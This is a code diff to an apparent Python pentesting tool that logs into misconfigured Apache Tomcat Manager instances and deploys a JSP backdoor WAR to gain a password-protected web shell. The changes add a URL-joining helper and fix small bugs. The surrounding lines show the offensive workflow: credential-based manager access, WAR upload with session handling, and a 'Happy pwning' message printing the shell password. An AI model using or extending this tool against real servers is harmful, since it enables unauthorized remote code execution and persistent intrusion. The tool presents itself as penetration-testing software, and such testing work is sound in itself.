@@ -86,6 +86,13 @@ def recvall(sock):
 
     sock.settimeout(None)
     return res
+
+def webPathJoin(_dir, _file):
+    if _file.startswith('/'):
+        return webPathJoin(_dir, _file[1:])
+    elif _dir.endswith('/'):
+        return webPathJoin(_dir[:-1], _file)
+    return _dir + '/' + _file
     
 def issueCommand(sock, cmd, isWindows):
     if isWindows:
@@ -533,7 +540,7 @@ def preparePayload(opts):
     return payload
 
 def invokeApplication(browser, url, opts):
-    appurl = os.path.join(url, opts.appname) + '/'
+    appurl = webPathJoin(url, opts.appname) + '/'
     logger.debug('Invoking application at url: "%s"' % appurl)
 
     host = url[:url.find(':')] if url.find(':') != -1 else url
@@ -607,12 +614,12 @@ def deployApplication(browser, url, appname, warpath, modify_action=False, addJs
                 logger.debug(
                     'Adjusting upload form action to conform custom manager\'s URL')
                 upload = action[action.find('/upload') + 1:]
-                browser.form.action = os.path.join(url, upload)
+                browser.form.action = webPathJoin(url, upload)
 
                 if addJsessionId:
                     for c in COOKIE_JAR:
                         if c.name.lower() == 'jsessionid':
-                            p = os.path.join(url, upload)
+                            p = webPathJoin(url, upload)
                             browser.form.action = p.replace('/upload', '/upload;jsessionid={}'.format(c.value))
                             INSERT_JSESSIONID = 'jsessionid={}'.format(c.value)
                             break
@@ -762,7 +769,7 @@ def validateManagerApplication(browser):
 def constructBaseUrl(host, url):
     host = host if host.startswith('http') else PROTO + '://' + host
     uri = url[1:] if url.startswith('/') else url
-    baseurl = os.path.join(host, uri)
+    baseurl = webPathJoin(host, uri)
     if INVOKE_URL and INVOKE_URL != baseurl: return INVOKE_URL
     return baseurl
 
@@ -818,7 +825,7 @@ def browseToManager(host, url, user, password):
 
     for suffix in tomcat_suffixes:
         try:
-            managerurl = os.path.join(baseurl, suffix)
+            managerurl = webPathJoin(baseurl, suffix)
             logger.debug('Trying to fetch: "%s"' % managerurl)
             browser.add_password(managerurl, user, password)
             page = browser.open(managerurl)
@@ -828,7 +835,7 @@ def browseToManager(host, url, user, password):
             if m:
                 logger.debug('Probably found something: Apache Tomcat/%s' % m.group(1))
                 tomcatVersion = m.group(1)
-		TOMCAT_VERSION = tomcatVersion
+                TOMCAT_VERSION = tomcatVersion
 
             if validateManagerApplication(browser) and tomcatVersion:
                 logger.info(
@@ -962,7 +969,7 @@ Penetration Testing utility aiming at presenting danger of leaving Tomcat miscon
         logging.warning(
             'Will generate JSP backdoor and store it into specified output path only.')
 
-    if opts.file and not os.path.exists(file):
+    if opts.file and not os.path.exists(opts.file):
         logger.error('Specified WAR file does not exists in local filesystem.')
         sys.exit(0)
 
@@ -1128,7 +1135,7 @@ def main():
             if status:
                 logger.info("\033[0;32m"+ '-' * 60 +"\033[1;0m")
                 logger.info("\033[0;32mJSP Backdoor up & running on %s/\033[1;0m" %
-                            os.path.join(constructBaseUrl(args[0], opts.url), opts.appname))
+                            webPathJoin(constructBaseUrl(args[0], opts.url), opts.appname))
                 if opts.shellpass.lower() != 'none':
                     logger.info(
                         "\033[0;33m\nHappy pwning. Here take that password for web shell: '%s'\033[1;0m" % opts.shellpass)
